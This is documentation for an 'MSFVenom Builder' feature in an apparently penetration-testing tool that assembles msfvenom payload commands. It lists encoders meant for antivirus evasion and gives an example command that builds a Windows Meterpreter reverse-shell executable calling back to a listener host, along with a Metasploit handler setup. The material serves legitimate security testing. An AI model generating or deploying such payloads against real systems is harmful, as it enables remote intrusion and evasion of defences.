# MSFVenom Builder

The MSFVenom Builder generates `msfvenom` payload commands without requiring you to memorize the full syntax. Configure your options in the GUI and copy the ready-to-run command.

## Accessing the MSFVenom Builder

Click **Tools** → **Command Hub** → **MSFVenom Builder**.

## Configuration Options

### Platform

Select the target operating system:

| Platform | Description |
|----------|-------------|
| Windows | Windows executables, DLLs, shellcode |
| Linux | ELF binaries, shared libraries |
| macOS | Mach-O executables |
| Web | PHP, Java, Python web payloads |
| Android | APK files |

### Category

Payload category, which varies by platform:

| Category | Description |
|----------|-------------|
| Meterpreter | Full-featured Meterpreter session |
| Shell | Basic command shell |
| Exec | Execute a single command |

### Format

Output file format:

**Executables:**
EXE, DLL, MSI (Windows) · ELF, ELF-SO, MACHO (Linux/macOS) · JAR, WAR (Java) · APK (Android)

**Scripts:**
ASP, ASPX (IIS) · JSP (Java) · PowerShell · Python · Bash

**Shellcode:**
Raw · C · C# · Hex · PowerShell array · VBScript

### Encoder

Payload encoder for AV evasion:

| Encoder | Platform | Description |
|---------|----------|-------------|
| shikata_ga_nai | x86 | Polymorphic XOR additive feedback encoder |
| x86/xor | x86 | XOR encoding |
| x64/xor | x64 | 64-bit XOR encoding |
| x86/alpha_mixed | x86 | Alphanumeric shellcode |
| x86/alpha_upper | x86 | Uppercase alphanumeric shellcode |
| x86/countdown | x86 | Single-byte XOR countdown |
| x86/fnstenv_mov | x86 | Variable-length fnstenv/mov encoder |
| x86/jmp_call_additive | x86 | Jump/call XOR additive feedback |
| x86/zutto_dekiru | x86 | XOR encoder |
| php/base64 | PHP | PHP base64 encoding |
| cmd/powershell_base64 | PowerShell | PowerShell base64 encoding |

### Encryption

Additional layer of encryption:

- None
- XOR
- AES256 (requires `--encrypt-key` and `--encrypt-iv`)
- RC4 (requires `--encrypt-key`)
- Base64

### Connection Options

| Field | Description |
|-------|-------------|
| **LHOST** | Your machine's IP address (where the payload calls back to) |
| **LPORT** | The listening port (default: 4444) |
| **RHOST** | Remote host IP (for bind shells) |
| **RPORT** | Remote host port (for bind shells) |

### Advanced Options

| Option | Description |
|--------|-------------|
| **Bad Characters** | Characters to exclude from the shellcode (e.g., `\x00\x0a\x0d`) |
| **Architecture** | `x86` or `x64` |
| **Exit Function** | How the process exits: `thread`, `process`, `seh`, `none` |
| **Iterations** | Number of encoding passes (higher = more obfuscation, larger payload) |
| **Output File** | Filename for the `-o` flag |

## Generated Command

As you configure options, the command is shown in real time at the bottom. Click **Copy** to copy the complete command to your clipboard.

**Example output:**
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -e x64/xor -i 5 -f exe -o payload.exe
```

## Setting Up a Listener

After generating your payload, set up a Metasploit listener:

```
msfconsole
use multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.10
set LPORT 4444
run
```

## Note

MSFVenom Builder generates the command only — it does not execute msfvenom. Copy the command and run it in your terminal.
